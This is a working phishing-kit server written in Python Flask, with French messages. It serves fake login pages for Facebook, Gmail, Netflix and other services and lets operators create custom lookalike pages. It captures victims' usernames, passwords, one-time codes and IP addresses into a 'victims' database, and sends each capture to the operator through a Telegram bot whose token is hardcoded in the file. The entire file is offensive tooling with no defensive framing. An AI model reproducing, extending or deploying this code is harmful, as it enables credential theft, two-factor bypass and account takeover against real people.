import os
from flask import Flask, request, jsonify, render_template, render_template_string
import requests
import datetime
import sqlite3
import json

app = Flask(__name__)

ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "8797682325:AAFMj6kcNv2R_EF3cWtl2pvWuRXVX4UwV7Q")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "6141755021")

DB_NAME = 'abeilles.db'

PLATFORM_LOGOS = {
    "Facebook": "https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg",
    "Instagram": "https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg",
    "TikTok": "https://upload.wikimedia.org/wikipedia/commons/a/a6/Logo_NIKE.svg",
    "Gmail": "https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.svg",
    "Netflix": "https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg",
    "Telegram": "https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg",
    "Amazon": "https://upload.wikimedia.org/wikipedia/commons/4/4a/Amazon_icon.svg",
    "Snapchat": "https://upload.wikimedia.org/wikipedia/commons/c/c4/Snapchat_logo.svg"
}

def get_db_connection():
    conn = sqlite3.connect(DB_NAME, timeout=30.0)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT,
            network TEXT,
            type TEXT,
            victimUser TEXT,
            victimPass TEXT,
            victimOtp TEXT,
            dateStr TEXT,
            timestamp INTEGER,
            ip TEXT,
            extra_info TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS custom_pages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT,
            slug TEXT UNIQUE,
            title TEXT,
            network TEXT,
            bg_type TEXT,
            bg_value TEXT,
            logo_url TEXT,
            logo_shape TEXT,
            fields_json TEXT,
            btn_text TEXT,
            html_code TEXT,
            redirect_url TEXT,
            redirect_google TEXT,
            redirect_facebook TEXT,
            redirect_github TEXT,
            mode TEXT,
            box_bg TEXT,
            box_width TEXT,
            created_at INTEGER
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def cleanup_expired_custom_pages():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        twenty_four_hours_ago = int((datetime.datetime.now().timestamp() - 86400) * 1000)
        cursor.execute("DELETE FROM custom_pages WHERE created_at < ?", (twenty_four_hours_ago,))
        conn.commit()
        conn.close()
    except Exception as e:
        print("Erreur nettoyage liens 24h:", e)

def send_telegram_photo_and_message(bot_token, chat_id, photo_url, caption):
    if not bot_token or bot_token == "VOTRE_BOT_TOKEN":
        return
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    payload = {
        "chat_id": chat_id,
        "photo": photo_url,
        "caption": caption,
        "parse_mode": "Markdown"
    }
    try:
        res = requests.post(url, json=payload, timeout=5)
        if res.status_code != 200:
            send_telegram_notification(bot_token, chat_id, caption)
    except Exception as e:
        print("Erreur Telegram Photo:", e)

def send_telegram_notification(bot_token, chat_id, message):
    if not bot_token or bot_token == "VOTRE_BOT_TOKEN":
        return
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print("Erreur Telegram:", e)

@app.route('/')
def index():
    cleanup_expired_custom_pages()
    return render_template('index.html')

@app.route('/phish/<path:subpath>')
def render_phish_page(subpath):
    cleanup_expired_custom_pages()
    subpath_clean = subpath.lower().strip('/')
    req_type = request.args.get('type', 'standard').lower()
    owner_param = request.args.get('user', 'Kim')
    
    db_slug = subpath_clean.replace('otp/', '').replace('standard/', '')
    clean_custom_slug = db_slug.replace('_otp', '').replace('-otp', '').replace('_standard', '').replace('-standard', '')

    conn = get_db_connection()
    cursor = conn.cursor()
    
    possible_slugs = [
        db_slug,
        clean_custom_slug,
        db_slug.replace('-', '_'),
        db_slug.replace('_', '-'),
        clean_custom_slug.replace('-', '_'),
        clean_custom_slug.replace('_', '-')
    ]
    
    cp = None
    for s in possible_slugs:
        cursor.execute("SELECT * FROM custom_pages WHERE LOWER(slug) = LOWER(?)", (s,))
        cp = cursor.fetchone()
        if cp:
            break
    conn.close()

    if cp:
        cp_dict = dict(cp)
        
        now_ts = int(datetime.datetime.now().timestamp() * 1000)
        if (now_ts - cp_dict.get("created_at", 0)) > 86400000:
            return "Ce lien a expiré après 24 heures.", 410

        redirect_url = cp_dict.get("redirect_url") or "https://www.google.com"

        # Gestion des modes Multi-fournisseurs (opt2 ou opt3)
        if cp_dict.get("mode") in ['opt2', 'opt3']:
            config = {
                "owner": cp_dict.get("owner", "Kim"),
                "title": cp_dict.get("title", "Connexion"),
                "logo_url": cp_dict.get("logo_url", ""),
                "bg_value": cp_dict.get("bg_value", "#111"),
                "redirect_google": cp_dict.get("redirect_google") or redirect_url,
                "redirect_facebook": cp_dict.get("redirect_facebook") or redirect_url,
                "redirect_github": cp_dict.get("redirect_github") or redirect_url
            }
            return render_template('custom_login_2.html', config=config)
        else:
            # Option 1 No-Code : Utilise custom_login.html
            fields_raw = cp_dict.get("fields_json") or '[]'
            try:
                fields_parsed = json.loads(fields_raw)
            except Exception:
                fields_parsed = []

            config = {
                "owner": cp_dict.get("owner", "Kim"),
                "title": cp_dict.get("title", "Connexion"),
                "network": cp_dict.get("network", "Facebook"),
                "bg_type": cp_dict.get("bg_type", "color"),
                "bg_value": cp_dict.get("bg_value", "#111"),
                "logo_url": cp_dict.get("logo_url", ""),
                "logo_shape": cp_dict.get("logo_shape", "circle"),
                "fields": fields_parsed,
                "btn_text": cp_dict.get("btn_text", "Se connecter"),
                "box_bg": cp_dict.get("box_bg") or "rgba(255, 255, 255, 0.95)",
                "box_width": cp_dict.get("box_width") or "420px",
                "redirect_url": redirect_url
            }
            return render_template('custom_login.html', config=config)

    is_otp_request = (req_type == 'otp' or 'otp' in request.path.lower() or 'otp' in subpath)
    base_name = clean_custom_slug.replace('_otp', '').replace('-otp', '')
    
    if is_otp_request:
        possible_templates = [
            f"otp/{db_slug}.html",
            f"otp/{base_name}_otp.html",
            f"otp/{base_name}-otp.html",
            f"otp/{base_name}.html"
        ]
    else:
        possible_templates = [
            f"standard/{db_slug}.html",
            f"standard/{base_name}.html",
            f"standard/{base_name}_otp.html",
            f"standard/{db_slug}_otp.html"
        ]

    for template_path in possible_templates:
        try:
            rendered_page = render_template(template_path, owner=owner_param, network=base_name.capitalize())
            return rendered_page
        except Exception:
            continue

    return f"Page introuvable ou lien expiré pour : {subpath}", 404

@app.route('/api/create_login', methods=['POST'])
def create_login():
    data = request.json or {}
    owner = data.get('owner', '').strip()
    slug = data.get('slug', '').strip().lower().replace(' ', '_')
    
    if not owner or not slug:
        return jsonify({"status": "error", "message": "Propriétaire ou slug manquant"})

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        now_ts = int(datetime.datetime.now().timestamp() * 1000)
        
        mode = data.get('mode', 'opt1')
        box_width = data.get('boxWidth', '420px')
        box_bg = data.get('boxBg', 'rgba(255, 255, 255, 0.95)')
        redirect_url = data.get('redirectUrl', 'https://www.google.com')

        if mode in ['opt2', 'opt3']:
            cursor.execute('''
                INSERT OR REPLACE INTO custom_pages (owner, slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, html_code, redirect_url, redirect_google, redirect_facebook, redirect_github, mode, box_bg, box_width, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                owner, slug, data.get('title', 'Connexion'), data.get('network', 'OAuth'),
                "color", data.get('bgValue', '#111'), data.get('logoUrl', ''), "circle", "[]", "Valider",
                "", redirect_url, 
                data.get('redirectGoogle', redirect_url), 
                data.get('redirectFacebook', redirect_url), 
                data.get('redirectGithub', redirect_url), 
                mode, box_bg, box_width, now_ts
            ))
        else:
            cursor.execute('''
                INSERT OR REPLACE INTO custom_pages (owner, slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, html_code, redirect_url, redirect_google, redirect_facebook, redirect_github, mode, box_bg, box_width, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                owner, slug, data.get('title'), data.get('network'),
                data.get('bgType'), data.get('bgValue'), data.get('logoUrl'),
                data.get('logoShape'), json.dumps(data.get('fields')), data.get('btnText'), "", redirect_url,
                redirect_url, redirect_url, redirect_url, 'opt1', box_bg, box_width, now_ts
            ))
            
        conn.commit()
        conn.close()
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/custom_pages', methods=['GET'])
def get_custom_pages():
    cleanup_expired_custom_pages()
    owner = request.args.get('owner', '').strip()
    conn = get_db_connection()
    cursor = conn.cursor()
    
    if owner:
        cursor.execute("SELECT * FROM custom_pages WHERE owner = ? ORDER BY id DESC", (owner,))
    else:
        cursor.execute("SELECT * FROM custom_pages ORDER BY id DESC")
        
    rows = cursor.fetchall()
    conn.close()
    
    pages = []
    for row in rows:
        pages.append({
            "slug": row["slug"],
            "title": row["title"],
            "network": row["network"],
            "mode": row["mode"]
        })
    return jsonify(pages)

@app.route('/api/clear_victims', methods=['POST'])
def clear_victims():
    data = request.json or {}
    owner = data.get('owner', '').strip()
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("DELETE FROM victims WHERE owner = ?", (owner,))
        conn.commit()
        conn.close()
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/capture', methods=['POST'])
def capture_data():
    data = request.json or {}
    owner = data.get('owner', 'Kim').strip()
    network = data.get('network', 'Facebook')
    v_user = data.get('victimUser', 'Inconnu')
    v_pass = data.get('victimPass', 'Inconnu')
    v_otp = data.get('otp', 'Aucun')
    v_type = data.get('type', 'standard')
    
    raw_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    v_ip = raw_ip.split(',')[0].strip() if raw_ip else "127.0.0.1"
    
    current_time = datetime.datetime.now()
    timestamp = int(current_time.timestamp() * 1000)
    date_str = current_time.strftime("%d/%m/%Y %H:%M:%S")

    conn = get_db_connection()
    cursor = conn.cursor()

    # CORRECTION DES DOUBLONS : Vérifier si une entrée récente existe déjà pour ce même utilisateur/réseau
    cursor.execute('''
        SELECT id FROM victims WHERE owner = ? AND network = ? AND victimUser = ? ORDER BY id DESC LIMIT 1
    ''', (owner, network, v_user))
    existing = cursor.fetchone()

    if existing and (v_otp and v_otp != 'Aucun' and v_otp != 'En attente OTP...'):
        # Mettre à jour la ligne existante au lieu d'en créer une nouvelle
        cursor.execute('''
            UPDATE victims SET victimPass = ?, victimOtp = ?, dateStr = ?, timestamp = ?, ip = ?, type = ? WHERE id = ?
        ''', (v_pass, v_otp, date_str, timestamp, v_ip, v_type, existing["id"]))
        conn.commit()
        conn.close()
        
        logo_img = PLATFORM_LOGOS.get(network, "https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg")
        alert_text = (
            f"🚨 *VICTIME MISE À JOUR (OTP VALIDÉ)* 🚨\n\n"
            f"📚 *Plateforme:* {network}\n"
            f"👤 *Propriétaire:* `{owner}`\n"
            f"🎯 *Identifiant:* `{v_user}`\n"
            f"🔑 *Mot de passe:* `{v_pass}`\n"
            f"🔒 *OTP:* `{v_otp}`\n"
            f"🕒 *Heure:* `{date_str}`\n"
            f"📍 *IP:* `{v_ip}`"
        )
        send_telegram_photo_and_message(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, logo_img, alert_text)
        return jsonify({"status": "success"})

    # Sinon, insertion normale
    cursor.execute('''
        INSERT INTO victims (owner, network, type, victimUser, victimPass, victimOtp, dateStr, timestamp, ip)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (owner, network, v_type, v_user, v_pass, v_otp, date_str, timestamp, v_ip))
    conn.commit()
    conn.close()

    logo_img = PLATFORM_LOGOS.get(network, "https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg")
    alert_text = (
        f"🚨 *NOUVELLE VICTIME CAPTURÉE* 🚨\n\n"
        f"📚 *Plateforme:* {network}\n"
        f"👤 *Propriétaire:* `{owner}`\n"
        f"🎯 *Identifiant:* `{v_user}`\n"
        f"🔑 *Action/Token:* `{v_pass}`\n"
        f"🕒 *Heure:* `{date_str}`\n"
        f"📍 *IP:* `{v_ip}`"
    )
    send_telegram_photo_and_message(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, logo_img, alert_text)

    return jsonify({"status": "success"})

@app.route('/api/victims', methods=['GET'])
def get_victims():
    owner = request.args.get('owner', '').strip()
    conn = get_db_connection()
    cursor = conn.cursor()
    
    if owner:
        cursor.execute("SELECT * FROM victims WHERE owner LIKE ? ORDER BY id DESC", (f"%{owner}%",))
    else:
        cursor.execute("SELECT * FROM victims ORDER BY id DESC")
        
    rows = cursor.fetchall()
    conn.close()
    
    victims_list = []
    for row in rows:
        victims_list.append({
            "id": row["id"],
            "owner": row["owner"],
            "network": row["network"],
            "type": row["type"],
            "victimUser": row["victimUser"],
            "victimPass": row["victimPass"],
            "otp": row["victimOtp"],
            "dateStr": row["dateStr"],
            "timestamp": row["timestamp"],
            "ip": row["ip"]
        })
    return jsonify(victims_list)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
